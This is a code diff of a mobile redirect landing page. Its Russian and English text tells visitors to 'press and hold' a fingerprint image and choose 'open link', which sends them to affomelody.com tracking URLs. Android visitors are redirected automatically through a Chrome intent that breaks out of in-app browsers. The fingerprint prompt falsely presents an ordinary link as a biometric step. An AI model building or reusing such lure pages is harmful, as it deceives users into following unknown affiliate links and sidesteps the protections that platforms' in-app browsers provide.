@@ -61,9 +61,11 @@
 </head>
 <body>
     <div class="ios-container" id="iosContainer">
-        <h2>🔊 УДЕРЖИВАЙТЕ ПАЛЕЦ НА ИЗОБРАЖЕНИИ!</h2>
-        <p>Выберите <span class="highlight">"Открыть ссылку"</span> чтобы продолжить</p>
-        <a href="https://prev.affomelody.com/f6bUZz" target="_blank">
+        <h2>🔊 УДЕРЖИВАЙТЕ ПАЛЕЦ НА ОТПЕЧАТКЕ!</h2>
+        <h2>🔊 PRESS AND HOLD YOUR FINGER ON THE PRINT </h2>
+        <p>Выберите <span class="highlight">"Открыть ссылку(в браузере)"</span> .</p>
+        <p>сhoose <span class="highlight">"open link"</span> .</p>
+        <a href="https://tone.affomelody.com/sL9OBt" target="_blank">
             <img src="https://so65a.github.io/2/1.png" alt="Отпечаток пальца" class="fingerprint">
         </a>
     </div>
@@ -74,11 +76,12 @@
 
         const iosContainer = document.getElementById('iosContainer');
 
-        const targetAndroidUrl = "https://bouncy.ai/220";
-        const targetIosUrl = "https://prev.affomelody.com/f6bUZz";
+        // Цільовий URL для Android
+        const targetAndroidUrl = "https://tone.affomelody.com/sL9OBt";
+        const chromeIntent = `intent://${targetAndroidUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
 
         if (isAndroid) {
-            window.location.href = targetAndroidUrl;
+            window.location.href = chromeIntent;
         } else if (isIOS) {
             iosContainer.style.display = 'flex';
         }
